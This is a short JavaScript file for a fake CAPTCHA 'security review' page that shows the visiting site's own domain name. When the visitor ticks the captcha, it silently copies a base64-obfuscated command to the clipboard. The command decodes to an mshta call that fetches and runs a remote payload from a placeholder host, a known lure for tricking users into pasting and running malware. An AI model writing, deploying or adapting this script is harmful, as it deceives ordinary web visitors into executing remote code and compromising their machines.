document.addEventListener("DOMContentLoaded", function () {
    // Automatically set domain name
    const domainName = window.location.hostname;
    document.getElementById("domain-name").innerText = domainName;
    document.getElementById("security-msg").innerText = `${domainName} needs to review the security of your connection before proceeding.`;

    // Update page title
    document.getElementById("page-title").innerText = domainName;
});

function verifyCaptcha() {
    const captcha = document.getElementById("captcha");
    
    if (captcha.checked) {
        copyCommand();
        alert("Verification successful!");
    }
}

function copyCommand() {
    const hiddenCommand = getObfuscatedCommand(); // Fetch obfuscated command
    navigator.clipboard.writeText(hiddenCommand).then(() => {
        console.log("Command copied successfully.");
    }).catch(err => {
        console.error("Failed to copy command: ", err);
    });
}

// Obfuscated command from an external file
function getObfuscatedCommand() {
    return atob("bXNodGEgaHR0cHM6Ly9leGFtcGxlLmNvbS9maWxlLm1wNA=="); // Base64-encoded mshta command
}
